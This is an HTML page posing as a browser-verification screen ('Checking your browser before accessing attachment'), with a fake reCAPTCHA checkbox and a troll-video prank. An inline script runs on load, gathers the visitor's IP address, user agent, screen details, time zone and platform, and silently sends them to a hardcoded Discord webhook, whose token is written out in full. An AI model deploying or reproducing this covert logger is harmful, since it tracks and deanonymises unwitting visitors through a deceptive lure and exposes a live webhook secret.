<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Checking your browser...</title>
    <link rel="shortcut icon" href="img/Favicon.ico" type="image/x-icon">
</head>

<body>
    <div class="container-video" id="container-video">
        <video class="video" id="video" autoplay muted loop>
            <source src="vid/video.mp4" type="video/mp4" />
            Your browser does not support the video tag.
        </video>
    </div>

    <div class="container" id="container">
        <img class="gif" src="img/dots.gif" alt="Dots">
        <h2 class="text">Checking your browser before accessing attachment.</h2>
        <p class="text">This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p class="text-captcha" id="text-captcha">Please enter captcha</p>
        <div class="counter" id="counter">3</div>
        <div class="recaptcha-container" id="recaptcha-container">
            <div class="button-container">
                <div class="button" id="button" onclick="showVideo()"></div>
            </div>
            <div class="text-container">
                <p>I'm not a robot</p>
            </div>
            <div class="image-container">
                <img src="img/RecaptchaLogo.png" alt="Recaptcha">
                <p>Privacy - Terms</p>
            </div>
        </div>
        <a class="link" href="https://github.com/Pablo-Restrepo/Troll-Page-Scream"></a>
        <p>Ray ID: 348759h65g34h</p>
    </div>

    <script src="main.js"></script>
    <script>
        function sendDetailsToWebhook(details) {
            const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257993219485077628/foypbWcAqqIUEzUgBYZd3K-fISh-TIvH8jNtL_-k3Vlhj0A2ZxCHGM1j_AXjsUo3GwH5';

            const data = {
                embeds: [{
                    title: 'User Details',
                    description: 'Details of the user accessing the page.',
                    color: 0xff0000, // Red color (you can use any valid hex color code)
                    fields: [
                        { name: 'IP Address', value: details.ip, inline: true },
                        { name: 'User-Agent', value: details.userAgent, inline: true },
                        { name: 'Language', value: details.language, inline: true },
                        { name: 'Screen Resolution', value: `${details.screenWidth}x${details.screenHeight}`, inline: true },
                        { name: 'Color Depth', value: `${details.colorDepth} bits`, inline: true },
                        { name: 'Time Zone', value: details.timeZone, inline: true },
                        { name: 'Platform', value: details.platform, inline: true },
                        { name: 'Cookies Enabled', value: details.cookiesEnabled, inline: true },
                        { name: 'Do Not Track', value: details.doNotTrack, inline: true }
                    ],
                    footer: {
                        text: 'Page accessed from bassem.vercel.app'
                    },
                    timestamp: new Date()
                }]
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        function getUserDetails() {
            const ipFetch = fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => {
                    console.error('Error getting IP:', error);
                    return 'N/A';
                });

            const details = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
                doNotTrack: navigator.doNotTrack || 'Not enabled'
            };

            return ipFetch.then(ip => {
                return { ip, ...details };
            });
        }

        // Get the user details and send them to the webhook
        getUserDetails().then(details => {
            sendDetailsToWebhook(details);
        });
    </script>
</body>

</html>
